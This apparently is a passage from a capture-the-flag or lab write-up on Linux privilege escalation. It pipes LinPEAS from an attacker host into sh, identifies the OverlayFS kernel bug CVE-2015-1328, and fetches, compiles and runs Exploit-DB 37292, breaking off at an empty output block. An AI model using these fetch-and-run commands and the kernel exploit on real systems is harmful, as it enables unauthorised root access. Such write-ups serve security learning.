# 🔼 Privilege Escalation

## Enumerating the Host

I uploaded and executed LinPEAS.

```bash
www-data@ubuntu:/tmp$ curl http://ATTACKER_IP/linpeas.sh | sh
```

The results revealed multiple kernel vulnerabilities.

Among them:

```text
CVE-2015-1328
OverlayFS
```

Several vulnerabilities were listed, but OverlayFS appeared to be one of the most practical options.

---

## Downloading the Exploit

The exploit used was:

```text
Exploit-DB 37292
```

Downloaded from:

```text
https://www.exploit-db.com/download/37292
```

Transferred to the target:

```bash
wget http://ATTACKER_IP/Downloads/37292.c
```

---

## Initial Mistake

I initially attempted to execute the source file directly.

```bash
./37292.c
```

This obviously failed because the file needed compilation.

### Lesson

Always verify whether a downloaded exploit is source code or a binary.

---

## Compiling the Exploit

```bash
gcc 37292.c -o 37292
```

Running the compiled binary:

```bash
./37292
```

Output:

```text
